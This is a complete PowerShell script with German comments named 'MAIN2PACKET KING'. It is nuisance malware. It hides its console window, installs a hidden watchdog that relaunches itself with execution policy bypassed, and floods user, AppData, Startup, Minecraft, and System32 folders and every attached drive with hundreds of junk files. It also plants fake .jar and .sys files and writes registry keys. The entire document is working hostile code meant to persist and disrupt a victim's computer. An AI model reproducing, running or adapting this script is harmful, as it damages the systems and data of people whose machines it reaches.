# ================================
# MAIN2PACKET KING - 20+ ORDNER EDITION (GEFIXT)
# ================================

# Fenster SOFORT verstecken
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

# ===== WATCHDOG IM HINTERGRUND =====
$watchdogCode = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid}
    if (`$p.Count -eq 0) { 
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
    }
    Start-Sleep -Seconds 2
}
"@
$watchdogCode | Out-File "$env:TEMP\main2packet_watchdog.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\main2packet_watchdog.ps1`""

# ===== ALLE ORDNER =====
$desktop = [Environment]::GetFolderPath("Desktop")
$documents = [Environment]::GetFolderPath("MyDocuments")
$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
$music = [Environment]::GetFolderPath("MyMusic")
$pictures = [Environment]::GetFolderPath("MyPictures")
$videos = [Environment]::GetFolderPath("MyVideos")
$favorites = [Environment]::GetFolderPath("Favorites")
$contacts = [Environment]::GetFolderPath("Contacts")
$links = [Environment]::GetFolderPath("Links")
$savedGames = [Environment]::GetFolderPath("SavedGames")
$searches = [Environment]::GetFolderPath("Searches")
$appData = $env:APPDATA
$localAppData = $env:LOCALAPPDATA
$temp = $env:TEMP
$userProfile = $env:USERPROFILE
$public = [Environment]::GetFolderPath("CommonDesktopDirectory")

# ===== ALLE ORDNER IN EINER LISTE =====
$locations = @(
    $desktop, $documents, $downloads, $music, $pictures, $videos,
    $favorites, $contacts, $links, $savedGames, $searches,
    "$appData\Microsoft\Windows\Recent",
    "$appData\Microsoft\Windows\Network Shortcuts",
    "$appData\Microsoft\Windows\Templates",
    "$localAppData\Temp",
    "$localAppData\Microsoft\Windows\INetCache",
    "$localAppData\Google\Chrome\User Data\Default\Cache",
    "$appData\Mozilla\Firefox\Profiles",
    "$appData\.minecraft",
    "$appData\.minecraft\mods",
    "$appData\.minecraft\config",
    "$appData\.minecraft\saves",
    "$appData\Roaming\Discord",
    "$appData\Roaming\Spotify",
    "$appData\Roaming\Steam",
    "$appData\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
    "$env:SystemRoot\Temp",
    "C:\ProgramData",
    "C:\Users\Public\Desktop",
    "C:\Users\Public\Documents",
    "C:\Users\Public\Downloads"
)

# ===== ORDNER UND DATEIEN ERSTELLEN =====
$computer = $env:COMPUTERNAME

foreach ($path in $locations) {
    if (Test-Path $path) {
        # MAIN2PACKET Hauptordner
        $mainFolder = Join-Path $path "MAIN2PACKET_KING"
        try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
        
        # 100 DATEIEN PRO ORDNER
        for ($i = 1; $i -le 100; $i++) {
            # Direkt im Ordner
            "$computer - MAIN2PACKET KING" | Out-File (Join-Path $path "MAIN2PACKET_$i.king") -Encoding UTF8 -Force
            
            # Im MAIN2PACKET Ordner
            "$computer - MAIN2PACKET KING" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
        }
        
        # 20 ZUFALLS-DATEIEN
        for ($r = 1; $r -le 20; $r++) {
            $rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
            "$computer - $rand" | Out-File (Join-Path $path "MAIN2PACKET_$rand.king") -Encoding UTF8 -Force
        }
    }
}

# ===== SYSTEMORDNER =====
$systemPaths = @(
    "$env:SystemRoot\System32\config\systemprofile\Desktop",
    "$env:SystemRoot\System32\config\systemprofile\Documents",
    "$env:SystemRoot\System32\drivers\etc",
    "$env:SystemRoot\System32\Tasks"
)

foreach ($sysPath in $systemPaths) {
    if (Test-Path $sysPath) {
        $mainSys = Join-Path $sysPath "MAIN2PACKET_SYSTEM"
        try { New-Item -Path $mainSys -ItemType Directory -Force | Out-Null } catch {}
        
        for ($j = 1; $j -le 50; $j++) {
            "SYSTEM - MAIN2PACKET" | Out-File (Join-Path $mainSys "core_$j.sys") -Encoding UTF8 -Force
        }
    }
}

# ===== MINECRAFT =====
$minecraftPaths = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\saves"
)

foreach ($mcPath in $minecraftPaths) {
    if (Test-Path $mcPath) {
        $mcMain = Join-Path $mcPath "MAIN2PACKET"
        try { New-Item -Path $mcMain -ItemType Directory -Force | Out-Null } catch {}
        
        for ($k = 1; $k -le 50; $k++) {
            "MAIN2PACKET MINECRAFT" | Out-File (Join-Path $mcMain "mod_$k.jar") -Encoding UTF8 -Force
        }
    }
}

# ===== REGISTRY =====
$regKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Main2packet",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Main2packet"
)

foreach ($key in $regKeys) {
    try {
        New-Item -Path $key -Force | Out-Null
        New-ItemProperty -Path $key -Name "InstallDate" -Value (Get-Date) -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $key -Name "Version" -Value "2.0" -PropertyType String -Force | Out-Null
    } catch {}
}

# ===== USB/EXTERNE LAUFWERKE =====
$usbJob = Start-Job -ScriptBlock {
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\" -and $_.Used -gt 0}
        foreach ($drive in $drives) {
            $drivePath = $drive.Root
            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
            try {
                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
                1..50 | ForEach-Object {
                    "USB - MAIN2PACKET" | Out-File (Join-Path $mainUSB "usb_$_.king") -Encoding UTF8 -Force
                }
            } catch {}
        }
        Start-Sleep -Seconds 60
    }
}

# ===== ALLES LÄUFT =====
while ($true) {
    Start-Sleep -Seconds 3600
}
